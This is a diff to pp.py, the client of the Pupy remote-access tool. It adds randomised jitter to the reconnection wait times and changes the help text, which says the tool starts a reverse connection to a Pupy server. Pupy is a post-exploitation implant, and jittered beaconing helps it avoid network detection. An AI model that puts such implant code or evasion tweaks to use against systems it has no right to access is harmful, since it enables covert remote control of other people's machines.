@@ -92,11 +92,11 @@ class ReverseSlaveService(Service):
 
 def get_next_wait(attempt):
 	if attempt<60:
-		return 0.5
+		return random.randint(5,10)/10.0
 	elif attempt<100:
-		return 3
+		return random.randint(30,50)/10.0
 	else:
-		return random.randint(15,30)
+		return random.randint(150,300)/10.0
 
 	
 def add_pseudo_pupy_module(HOST):
@@ -115,8 +115,8 @@ def main():
 	global LAUNCHER_ARGS
 
 	if len(sys.argv)>1:
-		parser = argparse.ArgumentParser(prog='pp.py', formatter_class=argparse.RawTextHelpFormatter, description="Starts a reverse connection to a Pupy server\nLast sources: https://github.com/n1nj4sec/pupy\nAuthor: @n1nj4sec (contact@n1nj4.eu)\n")
-		parser.add_argument('launcher', default="simple", choices=[x for x in conf.launchers], help="the launcher to use")
+		parser = argparse.ArgumentParser(prog='pp.py', formatter_class=argparse.RawTextHelpFormatter, description="Starts a reverse connection to a Pupy server using the selected launcher\nLast sources: https://github.com/n1nj4sec/pupy\nAuthor: @n1nj4sec (contact@n1nj4.eu)\n")
+		parser.add_argument('launcher', choices=[x for x in conf.launchers], help="the launcher to use")
 		parser.add_argument('launcher_args', nargs=argparse.REMAINDER, help="launcher arguments")
 		args=parser.parse_args()
 		LAUNCHER=args.launcher
